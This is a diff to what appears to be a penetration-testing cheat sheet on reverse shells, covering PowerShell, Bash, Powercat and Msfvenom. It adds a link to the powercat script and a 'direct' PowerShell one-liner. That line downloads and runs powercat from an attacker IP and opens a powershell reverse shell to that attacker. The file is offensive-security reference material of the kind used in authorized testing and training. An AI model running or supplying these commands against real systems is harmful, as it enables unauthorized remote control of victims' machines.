@@ -27,6 +27,7 @@ PS> $EncodedText =[Convert]::ToBase64String($Bytes)
 
 cmd> powershell -enc xyz
 ```
+API: https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.socket?view=net-7.0
 
 ## Bash 
 
@@ -40,6 +41,7 @@ Other shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-s
 
 ## Powercat - Office
 
+Powercat script: https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
 ```
 IEX(New-Object System.Net.WebClient).DownloadString('http://IpAtt/powercat.ps1');powercat -c IpAtt -p PortAtt -e powershell
 
@@ -51,6 +53,11 @@ for i in range(0, len(str), n):
 cd /usr/share/powershell-empire/empire/server/data/module_source/management
 python3 -m http.server 80
 ```
+or direct:
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$AttackerIp:$AttackerHttpPort/powercat.ps1');powercat -c $AttackerIp -p $AttackerNcPort -e powershell"
+```
+API: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0
 
 ## Mfsvenom
 
